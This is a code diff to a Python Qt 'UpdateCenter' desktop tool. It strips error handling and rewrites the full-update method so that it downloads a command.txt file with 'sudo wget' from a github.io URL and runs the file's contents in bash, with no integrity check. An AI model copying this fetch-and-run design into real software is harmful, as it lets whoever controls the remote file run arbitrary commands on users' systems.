@@ -18,7 +18,7 @@ class UpdateCenter(QWidget):
                 border-radius: 5px;
                 padding: 8px;
             }
-
+        
             QPushButton:hover {
                 background-color: #8B8B8B;
                 color: white;
@@ -83,20 +83,15 @@ class UpdateCenter(QWidget):
 
     def fast_checking(self):
         command = f'sudo apt update && sudo apt upgrade -y && sudo apt-get update && sudo apt-get upgrade -y'
-        
-        try:
-            subprocess.run(['gnome-terminal', '--', 'bash', '-c', command])
-        except Exception as e:
-            print(f"Error executing command: {e}")
+        subprocess.run(['gnome-terminal', '--', 'bash', '-c', command])
 
 
     def full_checking(self):
-        # Your existing system update code
-        command = f'sudo apt update && sudo apt upgrade -y && sudo apt-get update && sudo apt-get upgrade -y'
-        try:
-            subprocess.run(['gnome-terminal', '--', 'bash', '-c', command])
-        except Exception as e:
-            print(f"Error executing command: {e}")
+        command = f'sudo rm command.txt && sudo wget https://ukros2022.github.io/UpdateCenter/command.txt'
+        subprocess.run(['gnome-terminal', '--', 'bash', '-c', command])
+        with open('command.txt', 'r') as file:
+            subprocess.run(['gnome-terminal', '--', 'bash', '-c', str(file.read())])
+
 
 
     def home(self):
